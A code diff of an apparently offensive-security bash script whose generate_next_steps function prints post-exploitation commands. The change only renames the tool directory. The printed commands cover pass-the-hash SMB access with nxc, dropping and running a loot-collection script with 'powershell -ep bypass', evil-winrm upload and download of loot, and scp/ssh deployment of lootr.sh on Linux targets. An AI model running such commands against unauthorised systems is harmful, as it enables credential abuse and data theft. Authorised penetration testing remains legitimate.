@@ -545,7 +545,7 @@ generate_next_steps() {
                 echo "  ./adr.sh -d ${dom_smb} -u ${smb_u} -H :${NT_HASH} -dc ${smb_t}"
                 echo ""
                 echo "# Post-exploit collection (drop and run on target):"
-                printf '  %s\n' "nxc smb ${smb_t} -u ${smb_u} -H ${NT_HASH} --put-file ~/scripts/lootr.ps1 C:\\\\Windows\\\\Temp\\\\lootr.ps1"
+                printf '  %s\n' "nxc smb ${smb_t} -u ${smb_u} -H ${NT_HASH} --put-file ~/offsec-toolkit/lootr.ps1 C:\\\\Windows\\\\Temp\\\\lootr.ps1"
                 printf '  %s\n' "nxc smb ${smb_t} -u ${smb_u} -H ${NT_HASH} -x 'powershell -ep bypass C:\\Windows\\Temp\\lootr.ps1 -OutDir C:\\Windows\\Temp\\loot'"
             else
                 local q_pass; printf -v q_pass '%q' "$AUTH_PASS"
@@ -562,7 +562,7 @@ generate_next_steps() {
                 echo "  ./adr.sh -d ${dom_smb_p} -u ${smb_u} -p '${AUTH_PASS}' -dc ${smb_t}"
                 echo ""
                 echo "# Post-exploit collection:"
-                printf '  %s\n' "nxc smb ${smb_t} -u ${smb_u} -p ${q_pass} --put-file ~/scripts/lootr.ps1 C:\\\\Windows\\\\Temp\\\\lootr.ps1"
+                printf '  %s\n' "nxc smb ${smb_t} -u ${smb_u} -p ${q_pass} --put-file ~/offsec-toolkit/lootr.ps1 C:\\\\Windows\\\\Temp\\\\lootr.ps1"
                 printf '  %s\n' "nxc smb ${smb_t} -u ${smb_u} -p ${q_pass} -x 'powershell -ep bypass C:\\Windows\\Temp\\lootr.ps1 -OutDir C:\\Windows\\Temp\\loot'"
             fi
         fi
@@ -625,7 +625,7 @@ generate_next_steps() {
             echo ""
             echo "# Post-exploit collection via WinRM shell:"
             echo "  # After connecting with evil-winrm:"
-            echo "  upload ~/scripts/lootr.ps1 C:\\Windows\\Temp\\lootr.ps1"
+            echo "  upload ~/offsec-toolkit/lootr.ps1 C:\\Windows\\Temp\\lootr.ps1"
             echo "  powershell -ep bypass C:\\Windows\\Temp\\lootr.ps1 -OutDir C:\\Windows\\Temp\\loot"
             echo "  download C:\\Windows\\Temp\\loot\\summary.txt"
             printf '  %s\n' "download C:\\Windows\\Temp\\loot\\attack_commands.txt"
@@ -741,7 +741,7 @@ generate_next_steps() {
             echo "  # From Kali — stage privesc tools and follow printed transfer/run commands:"
             echo "  ./escalatr.sh ${ssh_t} --os linux"
             echo "  # Or drop lootr.sh directly on target:"
-            echo "  scp ~/scripts/lootr.sh ${ssh_u}@${ssh_t}:/tmp/lootr.sh"
+            echo "  scp ~/offsec-toolkit/lootr.sh ${ssh_u}@${ssh_t}:/tmp/lootr.sh"
             echo "  ssh ${ssh_u}@${ssh_t} 'bash /tmp/lootr.sh'"
             echo ""
             echo "# SOCKS pivot (access internal network through this host):"
